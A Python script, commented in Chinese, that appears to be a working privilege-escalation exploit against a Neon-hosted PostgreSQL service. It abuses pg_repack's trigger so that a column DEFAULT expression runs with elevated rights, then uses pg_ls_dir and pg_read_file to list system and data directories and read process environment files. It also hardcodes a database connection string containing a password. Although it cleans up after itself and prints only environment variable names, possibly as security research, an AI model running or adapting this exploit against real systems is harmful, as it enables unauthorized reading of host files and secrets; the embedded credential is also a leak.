# -*- coding: utf-8 -*-
"""内置函数提权读扩展 v2(干净版):目录侦察 + environ 变量名(脱敏) + $PGDATA
每轮独立重建与清理"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

def run_read(default_expr):
    """一轮:建 k_src + log(DEFAULT=default_expr) + 触发器 → INSERT 触发 → 返回 (oid, rows)"""
    q("DROP TABLE IF EXISTS k_src", fetch=False)
    q("CREATE TABLE k_src(id int, v text)", fetch=False)
    oid = q("SELECT 'k_src'::regclass::oid")[0][0]
    q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
    q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
    q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
    r = q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src, extra text DEFAULT %s)" % (oid, oid, default_expr), fetch=False)
    if isinstance(r, str) and r.startswith('ERR'):
        return oid, None, r
    r2 = q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)
    if isinstance(r2, str) and r2.startswith('ERR'):
        return oid, None, r2
    r3 = q("INSERT INTO k_src VALUES (1,'x')", fetch=False)
    rows = q("SELECT extra FROM repack.log_%d WHERE extra IS NOT NULL LIMIT 1" % oid)
    return oid, rows, r3

def cleanup_round(oid):
    q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
    q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
    q("DROP TABLE IF EXISTS k_src", fetch=False)
    q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)

print('=== [1] 目录侦察(pg_ls_dir, 经 DEFAULT ARRAY 子查询) ===')
for d in ('/', '/etc', '/var/lib', '/tmp', '/var/run', '/proc/1'):
    oid, rows, r = run_read("ARRAY(SELECT pg_ls_dir('%s'))::text" % d)
    if rows:
        print('  %s: %s' % (d, rows[0][0][:400]))
    else:
        print('  %s: ERR %s' % (d, (r or '')[:150]))
    cleanup_round(oid)

print('=== [2] environ 变量名(/proc/self/environ, 脱敏只显名) ===')
oid, rows, r = run_read("pg_read_file('/proc/self/environ')")
if rows:
    env = rows[0][0]
    names = [e.split('=', 1)[0] for e in env.split('\x00') if '=' in e]
    print('  var count:', len(names))
    print('  names:', names)
else:
    print('  ERR:', (r or '')[:200])
cleanup_round(oid)

print('=== [3] /proc/1/environ 变量名 ===')
oid, rows, r = run_read("pg_read_file('/proc/1/environ')")
if rows:
    env = rows[0][0]
    names = [e.split('=', 1)[0] for e in env.split('\x00') if '=' in e]
    print('  var count:', len(names))
    print('  names:', names)
else:
    print('  ERR:', (r or '')[:200])
cleanup_round(oid)

print('=== [4] $PGDATA 目录 ===')
oid, rows, r = run_read("ARRAY(SELECT pg_ls_dir(current_setting('data_directory')))::text")
if rows:
    print('  files:', rows[0][0][:600])
else:
    print('  ERR:', (r or '')[:200])
cleanup_round(oid)

print('=== [5] /etc 下 neon/proxy 相关配置文件探测 ===')
oid, rows, r = run_read("ARRAY(SELECT pg_ls_dir('/etc'))::text")
if rows:
    print('  /etc:', rows[0][0][:400])
cleanup_round(oid)

# 终清理
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
